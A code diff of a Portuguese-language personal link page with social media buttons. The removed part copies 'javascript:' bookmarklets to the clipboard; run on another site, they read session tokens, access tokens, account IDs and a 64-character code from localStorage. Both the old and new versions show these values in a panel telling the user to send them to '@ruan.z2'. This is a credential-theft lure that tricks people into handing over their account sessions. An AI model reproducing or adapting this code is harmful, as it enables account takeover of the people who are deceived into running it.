@@ -43,170 +43,130 @@
       gap: 10px;
     }
 
-    /* PC & IOS COPY */
-    #copyBtnPage {
-      background: #00eaff;
-      color: #000;
-      box-shadow: 0 0 12px #00eaff, 0 0 25px #00eaff inset;
-      animation: pulseNeon 2s infinite;
-    }
-    #copyBtnPage:hover {
-      transform: scale(1.07);
-      box-shadow: 0 0 18px #00eaff, 0 0 35px #00eaff inset;
-    }
+    /* Botões da página */
+    #btnCopyPC { background: #00eaff; color: #000; box-shadow: 0 0 12px #00eaff, 0 0 25px #00eaff inset; }
+    #btnCopyPC:hover { transform: scale(1.07); box-shadow: 0 0 18px #00eaff, 0 0 35px #00eaff inset; }
 
-    /* ANDROID COPY */
-    #copyAndroidBtnPage {
-      background: #00eaff;
-      color: #000;
-      border: 2px solid #00eaff;
-      box-shadow: 0 0 14px #00eaff;
-      animation: pulseNeon 2.1s infinite;
-    }
-    #copyAndroidBtnPage:hover {
-      transform: scale(1.07);
-      box-shadow: 0 0 22px #00eaff;
-    }
+    #btnCopyAndroid { background: #00eaff; color: #000; border:2px solid #00eaff; box-shadow:0 0 14px #00eaff; }
+    #btnCopyAndroid:hover { transform: scale(1.07); box-shadow:0 0 22px #00eaff; }
 
-    /* DISCORD */
-    #discordBtnPage {
-      background: #5865F2;
-      color: white;
-      box-shadow: 0 0 12px #5865F2;
-      animation: pulseDiscord 2.2s infinite;
-    }
-    #discordBtnPage:hover {
-      transform: scale(1.07);
-      box-shadow: 0 0 20px #5865F2;
-    }
+    #btnDiscord { background: #5865F2; color:white; box-shadow:0 0 12px #5865F2; }
+    #btnDiscord:hover { transform: scale(1.07); box-shadow:0 0 20px #5865F2; }
 
-    /* INSTAGRAM */
-    #instaBtnPage {
-      background: #ff2dab;
-      color: white;
-      box-shadow: 0 0 12px #ff2dab;
-      animation: pulseInsta 2.3s infinite;
-    }
-    #instaBtnPage:hover {
-      transform: scale(1.07);
-      box-shadow: 0 0 22px #ff2dab;
-    }
+    #btnInsta { background: #ff2dab; color:white; box-shadow:0 0 12px #ff2dab; }
+    #btnInsta:hover { transform: scale(1.07); box-shadow:0 0 22px #ff2dab; }
 
-    /* TIKTOK */
-    #tiktokBtnPage {
-      background: #000;
-      color: white;
-      box-shadow: 0 0 12px #00fff2;
-      border: 2px solid #00fff2;
-      animation: pulseTikTok 2.4s infinite;
-    }
-    #tiktokBtnPage:hover {
-      transform: scale(1.07);
-      box-shadow: 0 0 22px #00fff2;
-    }
+    #btnTikTok { background: #000; color:white; box-shadow:0 0 12px #00fff2; border:2px solid #00fff2; }
+    #btnTikTok:hover { transform: scale(1.07); box-shadow:0 0 22px #00fff2; }
 
-    /* ANIMAÇÕES */
-    @keyframes pulseTikTok {
-      0%   { box-shadow: 0 0 12px #00fff2; }
-      50%  { box-shadow: 0 0 28px #00fff2; }
-      100% { box-shadow: 0 0 12px #00fff2; }
-    }
-
-    @keyframes pulseInsta {
-      0% { box-shadow: 0 0 10px #ff2dab; }
-      50% { box-shadow: 0 0 26px #ff2dab; }
-      100% { box-shadow: 0 0 10px #ff2dab; }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes pulseNeon {
-      0%   { box-shadow: 0 0 10px #00eaff; }
-      50%  { box-shadow: 0 0 25px #00eaff; }
-      100% { box-shadow: 0 0 10px #00eaff; }
-    }
-
-    @keyframes pulseDiscord {
-      0%   { box-shadow: 0 0 10px #5865F2; }
-      50%  { box-shadow: 0 0 25px #5865F2; }
-      100% { box-shadow: 0 0 10px #5865F2; }
-    }
-
-    @keyframes glow {
-      from { text-shadow: 0 0 10px #00eaff; }
-      to   { text-shadow: 0 0 25px #00eaff; }
-    }
+    /* animações */
+    @keyframes fadeIn { from {opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
+    @keyframes glow { from {text-shadow:0 0 10px #00eaff;} to{ text-shadow:0 0 25px #00eaff; } }
   </style>
 </head>
-
 <body>
 
   <h1>Meus links</h1>
 
-  <!-- PC & IOS -->
-  <button id="copyBtnPage">📋 Copiar Link do Token (PC & iOS)</button>
-
-  <!-- ANDROID -->
-  <button id="copyAndroidBtnPage">📱 Copiar Token Android</button>
-
-  <!-- DISCORD -->
-  <button id="discordBtnPage">
-    <svg width="26" height="26" viewBox="0 0 245 240" fill="white">
-      <path d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.6-11.1-10.2-11.1zm36.2 0c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1z"/>
-      <path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.4 19V40.6c0-11.4-9.2-20.6-20.4-20.6zm-38.6 129s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3l-.2-.1c-1-.6-1.5-1-1.5-1s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.2-26.3 13.2s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z"/>
-    </svg>
-    Entrar no Discord
-  </button>
-
-  <!-- INSTAGRAM -->
-  <button id="instaBtnPage">
-    <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" width="26" height="26">
-    Meu Instagram
-  </button>
-
-  <!-- TIKTOK -->
-  <button id="tiktokBtnPage">
-    <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" width="26" height="26">
-    Meu TikTok
-  </button>
+  <button id="btnCopyPC">📋 Copiar/Mostrar Token (PC & iOS)</button>
+  <button id="btnCopyAndroid">📱 Copiar/Mostrar Token Android</button>
+  <button id="btnDiscord">Entrar no Discord</button>
+  <button id="btnInsta">Meu Instagram</button>
+  <button id="btnTikTok">Meu TikTok</button>
 
   <script>
-    /* Scripts Bookmarklets */
-    const scriptPCIOS = `javascript:(function(){let panel=document.createElement('div');panel.id='neonPanel';panel.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);opacity:0;background:#0f0f0f;color:#00ffea;padding:20px;border-radius:10px;width:350px;max-width:90vw;font-family:'Courier New',monospace;z-index:99999;box-shadow:0 0 20px #00ffe0,0 0 40px #00ffe0;transition:all 0.3s ease;animation:pulse 2s infinite alternate;";panel.innerHTML=\`<h3 style="margin:0 0 10px 0;font-size:14px;text-align:center;border-bottom:1px solid #00ffe0;padding-bottom:5px;">🔍 Dados Extraídos</h3><pre id="npData" style="background:#111;padding:10px;border-radius:8px;overflow:auto;max-height:220px;white-space:pre-wrap;font-size:13px;"></pre><p style="margin-top:10px;font-size:13px;text-align:center;">📨 <b>Envie todos esses dados para:</b> 👉 <b>@ruan.z2</b></p><div style="display:flex;justify-content:center;margin-top:10px;gap:10px;"><button id="copyBtnPanel" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;transition:all 0.2s ease;">📋 Copiar</button><button id="closeBtnPanel" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;transition:all 0.2s ease;">❌ Fechar</button></div>\`;document.body.appendChild(panel);let style=document.createElement('style');style.innerHTML='@keyframes pulse{0%{transform:translate(-50%,-50%) scale(1);}100%{transform:translate(-50%,-50%) scale(1.02);}} button:hover{transform:scale(1.1);box-shadow:0 0 5px #00ffe0;}';document.head.appendChild(style);setTimeout(()=>{panel.style.transform='translate(-50%,-50%) scale(1)';panel.style.opacity='1';},50);let token=localStorage.getItem("token")||"❌ Não encontrado";let pa=localStorage.getItem("persist:auth");let eat="❌ Não encontrado",nick="❌ Não encontrado",acc="❌ Não encontrado",reg="❌ Não encontrado";try{if(pa){let p1=JSON.parse(pa);if(p1.param){let p2=JSON.parse(p1.param);eat=p2.eat||eat;nick=p2.nickname||nick;acc=p2.account_id||acc;reg=p2.region||reg;}}}catch(e){}document.getElementById('npData').innerText=\`🔑 TOKEN:\n${token}\n\n🔐 ACESS_TOKEN (EAT):\n${eat}\n\n👤 NICK:\n${nick}\n\n🆔 ID:\n${acc}\n\n🌎 REGIÃO:\n${reg}\`;document.getElementById('copyBtnPanel').onclick=function(){navigator.clipboard.writeText(document.getElementById('npData').innerText);let btn=this;let original=btn.innerText;btn.innerText='✔ Copiado!';setTimeout(()=>{btn.innerText=original;},1500);};document.getElementById('closeBtnPanel').onclick=function(){panel.style.transform='translate(-50%,-50%) scale(0.8)';panel.style.opacity='0';setTimeout(()=>{panel.remove();},300);};})();`;
-
-    const scriptAndroid = `javascript:(()=>{let v=localStorage.getItem("CODE");if(!v||v.length!=64)return alert("❌ Nenhum CODE válido encontrado");let d=document.createElement("div");d.style="position:fixed;top:20px;left:20px;right:20px;padding:15px;background:#111;color:#0ff;font-family:monospace;border:2px solid #0ff;border-radius:10px;z-index:999999;box-shadow:0 0 10px #0ff";d.innerHTML='<div style="margin-bottom:8px;font-weight:bold">CODE encontrado:</div><div style="word-break:break-all;margin-bottom:10px">'+v+'</div><button id="c1Panel" style="padding:8px 12px;font-weight:bold;border:none;border-radius:6px;background:#0f0;color:#000">Copiar</button> <button id="c2Panel" style="padding:8px 12px;font-weight:bold;border:none;border-radius:6px;background:#f33;color:#fff">Fechar</button>';document.body.appendChild(d);c1Panel.onclick=()=>navigator.clipboard.writeText(v).then(()=>alert("✅ CODE copiado!")).catch(()=>alert("⚠️ Copie manualmente:\\n"+v));c2Panel.onclick=()=>d.remove();})();`;
-
-    /* Links externos */
     const linkDiscord = "https://discord.gg/KEQn5pPsWg";
     const linkInstagram = "https://www.instagram.com/ruan.z2/?hl=pt-br";
     const linkTikTok = "https://www.tiktok.com/@ruan.z2";
 
-    /* Funções dos botões da página */
-    document.getElementById("copyBtnPage").onclick = () => {
-      navigator.clipboard.writeText(scriptPCIOS);
-      alert("Link (PC & iOS) copiado!");
+    /* Função para criar painel */
+    function criarPainel(dados) {
+      if(document.getElementById('painelToken')) return; // evita criar mais de um
+
+      const panel = document.createElement('div');
+      panel.id = 'painelToken';
+      panel.style.cssText = `
+        position:fixed;
+        top:50%; left:50%;
+        transform:translate(-50%,-50%) scale(0);
+        opacity:0;
+        background:#0f0f0f;
+        color:#00ffea;
+        padding:20px;
+        border-radius:10px;
+        width:350px;
+        max-width:90vw;
+        font-family:'Courier New',monospace;
+        z-index:99999;
+        box-shadow:0 0 20px #00ffe0,0 0 40px #00ffe0;
+        transition:all 0.3s ease;
+      `;
+
+      panel.innerHTML = `
+        <h3 style="margin:0 0 10px 0;font-size:14px;text-align:center;border-bottom:1px solid #00ffe0;padding-bottom:5px;">🔍 Dados Extraídos</h3>
+        <pre id="painelData" style="background:#111;padding:10px;border-radius:8px;overflow:auto;max-height:220px;white-space:pre-wrap;font-size:13px;">${dados}</pre>
+        <p style="margin-top:10px;font-size:13px;text-align:center;">📨 <b>Envie todos esses dados para:</b> 👉 <b>@ruan.z2</b></p>
+        <div style="display:flex;justify-content:center;margin-top:10px;gap:10px;">
+          <button id="btnCopiarPainel" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;">📋 Copiar</button>
+          <button id="btnFecharPainel" style="background:#ff3b3b;color:#fff;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;">❌ Fechar</button>
+        </div>
+      `;
+
+      document.body.appendChild(panel);
+      setTimeout(()=>{ panel.style.transform='translate(-50%,-50%) scale(1)'; panel.style.opacity='1'; },50);
+
+      document.getElementById('btnCopiarPainel').onclick = () => {
+        navigator.clipboard.writeText(dados);
+        let btn = document.getElementById('btnCopiarPainel');
+        let original = btn.innerText;
+        btn.innerText='✔ Copiado!';
+        setTimeout(()=>{btn.innerText=original;},1500);
+      };
+
+      document.getElementById('btnFecharPainel').onclick = () => {
+        panel.style.transform='translate(-50%,-50%) scale(0.8)';
+        panel.style.opacity='0';
+        setTimeout(()=>{ panel.remove(); },300);
+      };
+    }
+
+    /* Dados do token (simulação, pega do localStorage se existir) */
+    function pegarDadosToken() {
+      const token = localStorage.getItem("token") || "❌ Não encontrado";
+      const pa = localStorage.getItem("persist:auth");
+      let eat="❌ Não encontrado", nick="❌ Não encontrado", acc="❌ Não encontrado", reg="❌ Não encontrado";
+
+      try {
+        if(pa){
+          let p1 = JSON.parse(pa);
+          if(p1.param){
+            let p2 = JSON.parse(p1.param);
+            eat = p2.eat || eat;
+            nick = p2.nickname || nick;
+            acc = p2.account_id || acc;
+            reg = p2.region || reg;
+          }
+        }
+      } catch(e){}
+
+      return `🔑 TOKEN:\n${token}\n\n🔐 ACESS_TOKEN (EAT):\n${eat}\n\n👤 NICK:\n${nick}\n\n🆔 ID:\n${acc}\n\n🌎 REGIÃO:\n${reg}`;
+    }
+
+    /* Eventos dos botões */
+    document.getElementById('btnCopyPC').onclick = () => {
+      const dados = pegarDadosToken();
+      criarPainel(dados);
     };
 
-    document.getElementById("copyAndroidBtnPage").onclick = () => {
-      navigator.clipboard.writeText(scriptAndroid);
-      alert("Link Android copiado!");
+    document.getElementById('btnCopyAndroid').onclick = () => {
+      const code = localStorage.getItem("CODE") || "❌ Nenhum CODE válido encontrado";
+      criarPainel(`CODE Android:\n${code}`);
     };
 
-    document.getElementById("discordBtnPage").onclick = () => {
-      window.location.href = linkDiscord;
-    };
+    document.getElementById('btnDiscord').onclick = () => { window.open(linkDiscord, "_blank"); };
+    document.getElementById('btnInsta').onclick = () => { window.open(linkInstagram, "_blank"); };
+    document.getElementById('btnTikTok').onclick = () => { window.open(linkTikTok, "_blank"); };
 
-    document.getElementById("instaBtnPage").onclick = () => {
-      window.location.href = linkInstagram;
-    };
-
-    document.getElementById("tiktokBtnPage").onclick = () => {
-      window.location.href = linkTikTok;
-    };
   </script>
-
 </body>
 </html>
